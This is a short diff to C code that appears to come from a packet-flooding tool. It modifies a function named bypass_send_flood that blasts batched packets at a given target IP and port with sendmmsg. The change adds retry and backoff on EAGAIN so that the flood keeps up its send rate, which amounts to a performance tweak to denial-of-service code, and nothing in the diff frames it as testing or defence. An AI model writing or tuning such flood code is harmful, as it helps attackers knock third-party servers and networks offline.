@@ -5,6 +5,7 @@
 #include <time.h>
 #include <stdio.h>
 #include <errno.h>
+#include <sched.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
 #include <arpa/inet.h>
@@ -344,12 +345,16 @@ EXPORT int bypass_send_flood(uint32_t target_ip, uint16_t target_port,
             batch++;
         }
         if (batch == 0) continue;
-        int off = 0, rem = batch;
+        int off = 0, rem = batch, eagain_cnt = 0;
         while (rem > 0) {
             int ret = (int)sendmmsg(sock, msgs + off, rem, MSG_DONTWAIT);
-            if (ret > 0) { off += ret; rem -= ret; total_sent += ret; }
-            else if (errno == EAGAIN || errno == EWOULDBLOCK) continue;
-            else break;
+            if (ret > 0) { off += ret; rem -= ret; total_sent += ret; eagain_cnt = 0; }
+            else if (errno == EAGAIN || errno == EWOULDBLOCK) {
+                eagain_cnt++;
+                if (eagain_cnt < 10) { sched_yield(); }
+                else { struct timespec ts = {0, 100 * 1000L}; nanosleep(&ts, NULL); }
+                continue;
+            } else break;
         }
     }
 
